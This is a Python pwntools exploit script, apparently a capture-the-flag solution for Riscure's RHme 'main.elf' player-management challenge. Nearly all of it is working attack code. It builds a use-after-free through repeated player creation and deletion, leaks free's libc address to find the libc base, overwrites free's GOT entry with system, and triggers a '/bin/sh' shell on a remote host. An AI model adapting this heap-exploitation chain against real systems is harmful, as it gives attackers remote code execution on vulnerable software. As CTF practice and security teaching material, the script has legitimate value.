#!/usr/bin/env python2

# setup:
#   useradd pwn
#   mkdir -p /opt/riscure/pwn/
# run the binary:
#   ./main.elf
#   gdb --eval-command="set follow-fork-mode child" --eval-command="handle SIGINT stop" -p `pidof main.elf`

from pwn import *
import re

def extract_string(r, string):
    m = re.search(r, string)
    if m:
        return m.group(1)
    else:
        return ""

context(arch='amd64',
        bits=64,
        os='linux',
        aslr=True)

FREE_GOT = 0x603018
REMOTE = True

# GOT: readelf -a main.elf | grep -i free
# Free: readelf -s libc.so.6 | grep free
# System: readelf -s libc.so.6 | grep system

if REMOTE:
    p = remote("pwn.rhme.riscure.com", "1337")
    LIBC_FREE_OFFSET = 0x844f0
    LIBC_SYSTEM_OFFSET = 0x45390
else:
    p = remote("192.168.56.4", "1337")
    LIBC_FREE_OFFSET = 0x7b4e0
    LIBC_SYSTEM_OFFSET = 0x03f450

log.info("Creating users")

for x in range(0,5):
    p.recvuntil("Your choice: ")
    p.sendline("1") # add player
    p.recvuntil("Enter player name: ")
    p.sendline(str(x) * 254)
    p.recvuntil("Enter attack points: ")
    p.sendline("1")
    p.recvuntil("Enter defense points: ")
    p.sendline("1")
    p.recvuntil("Enter speed: ")
    p.sendline("1")
    p.recvuntil("Enter precision: ")
    p.sendline("1")

p.recvuntil("Your choice: ")
p.sendline("3") # select player
p.recvuntil("Enter index: ")
p.sendline("2")

log.info("Deleting users")

for x in range(0,5):
    p.recvuntil("Your choice: ")
    p.sendline("2") # delete player
    p.recvuntil("Enter index: ")
    p.sendline(str(x))

log.info("Creating other users")

for x in range(0,4):
    p.recvuntil("Your choice: ")
    p.sendline("1") # add player
    p.recvuntil("Enter player name: ")
    payload  = ""
    # comment out stuff otherwise it will be executed
    payload += "/bin/sh #"
    payload += str(x) * 7
    payload += str(p32(FREE_GOT))
    payload += str(x) * 16
    p.sendline(payload)
    p.recvuntil("Enter attack points: ")
    p.sendline("1")
    p.recvuntil("Enter defense points: ")
    p.sendline("1")
    p.recvuntil("Enter speed: ")
    p.sendline("1")
    p.recvuntil("Enter precision: ")
    p.sendline("1")

p.recvuntil("Your choice: ")
p.sendline("5") # show player
leak = p.recvuntil("Your choice: ")
a = extract_string(r"Name: (.+)", leak).ljust(8, "\x00")
b = u64(a)
log.success("Leaked free address: 0x{0:x}".format(b))
libc_base = b - LIBC_FREE_OFFSET
log.info("Libc Base Address 0x{0:x}".format(libc_base))
adr_overwrite = libc_base + LIBC_SYSTEM_OFFSET
log.info("Overwrite Address 0x{0:x}".format(adr_overwrite))

p.sendline("4") # edit player
p.recvuntil("Your choice: ")
p.sendline("1")
p.recvuntil("Enter new name: ")
p.sendline(p64(adr_overwrite))
p.recvuntil("Your choice: ")
p.sendline("0")

p.recvuntil("Your choice: ")
p.sendline("2")
p.recvuntil("Enter index: ")
p.sendline("0")

log.success("Should have got a shell!")

p.interactive()

